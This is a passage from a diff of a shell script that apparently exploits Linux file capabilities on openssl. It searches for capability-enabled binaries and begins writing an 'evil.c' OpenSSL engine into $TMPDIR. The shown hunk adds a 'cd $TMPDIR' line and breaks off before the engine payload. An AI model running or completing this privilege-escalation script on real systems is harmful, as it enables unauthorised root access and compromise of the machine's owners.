@@ -1,6 +1,7 @@
 #!/bin/sh
 
 if getcap -r / | grep "openssl"; then
+cd $TMPDIR
 touch $TMPDIR/evil.c
 cat > $TMPDIR/evil.c << EOF
 #include <openssl/engine.h>
